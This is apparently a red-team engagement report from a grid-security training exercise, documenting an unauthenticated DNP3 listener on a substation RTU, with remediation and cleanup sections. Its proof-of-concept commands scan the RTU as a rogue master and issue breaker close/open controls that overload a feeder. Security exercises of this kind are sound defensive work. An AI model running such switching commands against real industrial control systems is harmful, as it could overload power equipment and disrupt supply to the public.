# Red Team Engagement Report — PU-S03

**Operation PRABAL PRAHARI | Prabal Urja | River Bend Substation**  
**Engagement Type:** Red-vs-Blue Live-Fire Exercise  
**Date:** [YYYY-MM-DD]  
**Classification:** TRAINING

---

## Executive Summary

The River Bend RTU exposes a retained DNP3/TCP maintenance listener on TCP 20001. The listener accepts sessions and protocol requests from DNP3 master addresses beyond the expected maintenance master. No DNP3 Secure Authentication or independent command approval is applied.

A second OpenDNP3 master was able to perform integrity reads, identify breaker and process points, and issue valid Select-Before-Operate controls while the legitimate load-dispatch master remained connected. Closing the River Bend bus tie and opening Feeder A transferred the modeled load to Feeder B. The resulting state increased Feeder B to approximately 620 MW, transformer loading to approximately 101.4% and northern-corridor loading to approximately 96.8%.

The exercise demonstrates that protocol correctness and network reachability were treated as sufficient authority for field switching.

---

## Finding 1: Unauthorised DNP3 Master and Breaker Control

**Severity:** High  
**Affected asset:** `PU-RB-RTU-07`  
**Affected service:** DNP3/TCP maintenance listener, TCP 20001  
**DNP3 outstation address:** 10  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**MITRE ATT&CK for ICS:** T1692.001, T0831, T0836

### Technical description

The maintenance DNP3 stack remained reachable from the exercise OT network and was configured to respond to unexpected master link addresses. A remote client could:

1. establish a DNP3 master session;
2. perform class/integrity scans;
3. enumerate binary and analog points;
4. submit Control Relay Output Blocks;
5. complete Select-Before-Operate transactions;
6. change field switching state without operator authentication.

The primary master service on TCP 20000 continued polling throughout the activity, so simple service-availability monitoring did not identify the command as unauthorised.

### Proof of concept

Set the target and client:

```bash
export TARGET=<SCENARIO_3_IP>
export DNP3=/opt/prabal-red-tools/prabal-dnp3-command
```

Confirm that an unexpected master address receives a valid integrity response:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 \
  --action scan
```

Close the River Bend bus tie at binary-output point 1:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 \
  --action close --point 1
```

Open Feeder A at binary-output point 0:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 \
  --action open --point 0
```

Verify the final DNP3 point state:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 \
  --action scan
```

### Observed result

```text
Binary input 0: False   Feeder A open
Binary input 1: True    Bus tie closed
Binary input 2: True    Feeder B closed
Analog input 0: ~0 MW
Analog input 1: ~620 MW
Analog input 2: ~215.8 kV
Analog input 3: ~101.4%
Analog input 4: ~96.8%
Analog input 5: ~49.94 Hz
Overload alarm: Active
```

### Preconditions

- Network reachability to TCP 20001
- Knowledge or discovery of DNP3 outstation address 10
- A standards-compliant DNP3 master implementation
- No credentials required

### Security impact

**Confidentiality:** Medium  
The point model and process telemetry can be read by an unauthorised master.

**Integrity:** High  
The attacker can alter breaker state and power-flow topology.

**Availability:** High  
Incorrect switching can overload a corridor, de-energise loads or force defensive islanding even while network services remain online.

### Operational impact

The tested sequence transfers River Bend load onto a single feeder and significantly reduces transformer and corridor margin. In a real power system, equivalent unauthorised switching could contribute to overload, protection operation, load shedding or wider instability depending on prevailing system conditions.

### Root cause

- retained maintenance path not removed after support activity;
- no source-IP allowlist;
- permissive DNP3 master-address handling;
- no DNP3 Secure Authentication;
- no independent operator approval tied to switching controls;
- monitoring focused on service uptime rather than command source and semantics.

### Remediation

1. Remove or disable TCP 20001 when maintenance is not authorised.
2. Restrict the service to an approved jump host and maintenance window.
3. Enforce source-IP and interface allowlisting.
4. Bind outstation relationships to approved DNP3 master addresses.
5. Deploy DNP3 Secure Authentication where endpoint support permits.
6. Alert on second masters, changed link addresses and remote control commands.
7. Correlate SELECT/OPERATE controls with switching orders and operator identity.
8. Preserve RTU sequence-of-events and packet evidence.
9. Test containment procedures that keep the primary master available.

### Validation of remediation

After containment, the Red source should be unable to connect to TCP 20001:

```bash
nc -vz -w 3 "$TARGET" 20001
```

The legitimate primary master should remain active, and Blue should obtain:

```text
SERVICE_STATUS:UP
```

---

## Attack Timeline

| Time | Red action | Evidence | Operational result |
|---|---|---|---|
| `[T0]` | Narrow service discovery | Nmap output | TCP 20001 identified |
| `[T1]` | Integrity scan as master 2 | OpenDNP3 output | Point model returned |
| `[T2]` | Integrity scan as master 77 | OpenDNP3 output | Unexpected master accepted |
| `[T3]` | SELECT/OPERATE close point 1 | Client output / PCAP | Bus tie closed |
| `[T4]` | SELECT/OPERATE open point 0 | Client output / PCAP | Feeder A opened |
| `[T5]` | Integrity verification | Client output / console | Feeder B carries transferred load |
| `[T6]` | Controlled cleanup | Client output | Approved topology restored if instructed |

---

## Artifacts

### Target evidence

```text
/var/log/prabal-urja/scenario3/dnp3-commands.jsonl
/var/log/prabal-urja/scenario3/process-events.jsonl
/var/log/prabal-urja/scenario3/process-historian.csv
/var/log/prabal-urja/scenario3/pcap/
/var/lib/prabal-urja/scenario3/state.json
```

### Red evidence

```text
/tmp/riverbend-scan-master2.log
/tmp/riverbend-scan-master77.log
/tmp/riverbend-close-tie.log
/tmp/riverbend-open-feeder-a.log
/tmp/riverbend-final-scan.log
```

### Required screenshots

- service discovery;
- integrity response from unexpected master address;
- bus-tie control;
- Feeder A control;
- final operational measurements;
- proof that the RTU remained available.

---

## Pivot and Campaign Handoff

The finding demonstrates that Prabal Urja’s field-control environment trusts protocol-valid commands without sufficient independent authorisation. The next investigation area is the control centre, where legitimate telecontrol utilities and trusted host identity may provide similar command authority. This handoff supports Scenario 4’s IEC-104 focus but does not expose Scenario 4 credentials, endpoints or implementation details.

---

## Engagement Safety and Cleanup

The Red Team did not:

- flood or fuzz the DNP3 service;
- stop the legitimate master;
- crash the RTU;
- open both feeders;
- attack the hypervisor or management network;
- alter evidence on the target.

When directed, the Red Team restored Feeder A before opening the bus tie and verified the return to normal split loading.

---

## Prepared By

**Red Team Operator:** [Name]  
**Red Team Lead:** [Name]  
**Evidence Archive:** [Reference]  
**Report Status:** [Draft / Final]
